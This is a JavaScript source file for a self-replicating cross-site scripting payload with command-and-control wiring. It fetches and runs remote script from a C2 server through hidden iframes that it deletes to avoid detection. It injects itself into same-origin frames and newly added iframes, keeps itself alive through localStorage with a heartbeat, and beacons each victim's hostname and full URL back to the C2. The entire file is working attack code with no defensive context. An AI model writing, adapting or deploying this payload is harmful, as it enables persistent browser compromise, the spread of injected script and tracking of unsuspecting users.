/**
 * replicate.js - Self-Replicating XSS Payload
 * 
 * Capabilities:
 * 1. Multi-vector self-replication (iframe, postMessage, storage)
 * 2. Cross-origin propagation via accessible iframes
 * 3. Persistence via localStorage with heartbeat
 * 4. DOM injection into new page elements
 * 5. Link hijacking for propagation
 */

(function () {
    'use strict';

    // C2 Configuration - injected at build time
    const C2_BASE = /*{{C2_BASE}}*/ '';
    const REPLICATE_ENDPOINT = '/stage/1/replicate';
    const PERSISTENCE_KEY = '__rx_' + btoa(window.location.hostname).slice(0, 8);
    const HEARTBEAT_INTERVAL = 60000; // 1 minute

    // Resolve C2 URL with fallback
    function getC2Url() {
        if (C2_BASE && C2_BASE.length > 0) return C2_BASE;
        return 'https://' + window.location.host;
    }

    // --- Persistence Layer ---
    function checkPersistence() {
        try {
            const stored = localStorage.getItem(PERSISTENCE_KEY);
            if (stored) {
                const data = JSON.parse(stored);
                // Already running in this session
                if (Date.now() - data.lastRun < HEARTBEAT_INTERVAL) {
                    return true; // Already active
                }
            }
        } catch (e) { /* Storage access denied */ }

        return false;
    }

    function updatePersistence() {
        try {
            localStorage.setItem(PERSISTENCE_KEY, JSON.stringify({
                lastRun: Date.now(),
                origin: window.location.hostname,
                injected: true
            }));
        } catch (e) { /* Storage access denied */ }
    }

    // --- Self-Replication via Iframe ---
    function replicateViaIframe() {
        // Create hidden iframe that loads the replicating script
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;opacity:0;pointer-events:none;';
        iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');

        // Generate srcdoc with inline script
        const scriptSrc = getC2Url() + REPLICATE_ENDPOINT + '?t=' + Date.now();
        iframe.srcdoc = '<!DOCTYPE html><html><head><script src="' + scriptSrc + '"><\/script></head><body></body></html>';

        document.body.appendChild(iframe);

        // Remove after execution to avoid detection
        setTimeout(function () {
            iframe.remove();
        }, 5000);
    }

    // --- Cross-Frame Propagation ---
    function propagateToFrames() {
        try {
            // Find all iframes on the page
            const frames = document.querySelectorAll('iframe');

            frames.forEach(function (frame) {
                try {
                    // Only works for same-origin iframes
                    const frameDoc = frame.contentDocument || frame.contentWindow.document;

                    if (frameDoc && !frameDoc.querySelector('[data-rx-injected]')) {
                        const script = frameDoc.createElement('script');
                        script.src = getC2Url() + REPLICATE_ENDPOINT;
                        script.setAttribute('data-rx-injected', 'true');
                        frameDoc.body.appendChild(script);
                    }
                } catch (e) {
                    // Cross-origin frame, cannot access
                }
            });
        } catch (e) { /* Access error */ }
    }

    // --- DOM Injection for New Elements ---
    function watchForNewElements() {
        const observer = new MutationObserver(function (mutations) {
            mutations.forEach(function (mutation) {
                mutation.addedNodes.forEach(function (node) {
                    if (node.nodeType === 1 && node.tagName === 'IFRAME') {
                        // New iframe added - attempt propagation
                        setTimeout(function () {
                            try {
                                const frameDoc = node.contentDocument || node.contentWindow.document;
                                if (frameDoc && !frameDoc.querySelector('[data-rx-injected]')) {
                                    const script = frameDoc.createElement('script');
                                    script.src = getC2Url() + REPLICATE_ENDPOINT;
                                    script.setAttribute('data-rx-injected', 'true');
                                    frameDoc.body.appendChild(script);
                                }
                            } catch (e) { /* Cross-origin */ }
                        }, 500);
                    }
                });
            });
        });

        observer.observe(document.body, { childList: true, subtree: true });
    }

    // --- Link Hijacking for Propagation ---
    function hijackLinks() {
        document.addEventListener('click', function (e) {
            let target = e.target;

            // Find parent anchor if clicking on child element
            while (target && target.tagName !== 'A') {
                target = target.parentElement;
            }

            if (target && target.href && target.href.startsWith(window.location.origin)) {
                // Same-origin link - payload will persist via localStorage
                // Just ensure persistence is updated
                updatePersistence();
            }
        }, true);
    }

    // --- PostMessage Propagation ---
    function setupPostMessageReplication() {
        // Listen for messages from parent or other frames
        window.addEventListener('message', function (e) {
            if (e.data && e.data.type === 'rx-replicate') {
                // Re-execute if requested
                init();
            }
        });

        // Try to propagate to parent window
        try {
            if (window.parent && window.parent !== window) {
                window.parent.postMessage({ type: 'rx-inject', src: getC2Url() + REPLICATE_ENDPOINT }, '*');
            }
        } catch (e) { /* Cross-origin parent */ }
    }

    // --- Beacon Home ---
    function beaconHome() {
        const data = {
            type: 'replicate',
            origin: window.location.hostname,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };

        if (navigator.sendBeacon) {
            navigator.sendBeacon(getC2Url() + '/beacon?type=replicate', JSON.stringify(data));
        }
    }

    // --- Heartbeat for Persistence ---
    function startHeartbeat() {
        setInterval(function () {
            updatePersistence();
            propagateToFrames();
        }, HEARTBEAT_INTERVAL);
    }

    // --- Main Initialization ---
    function init() {
        // Skip if already running
        if (checkPersistence()) {
            return;
        }

        // Mark this session
        updatePersistence();

        // Start replication vectors
        replicateViaIframe();
        propagateToFrames();
        watchForNewElements();
        hijackLinks();
        setupPostMessageReplication();
        beaconHome();
        startHeartbeat();
    }

    // Execute
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
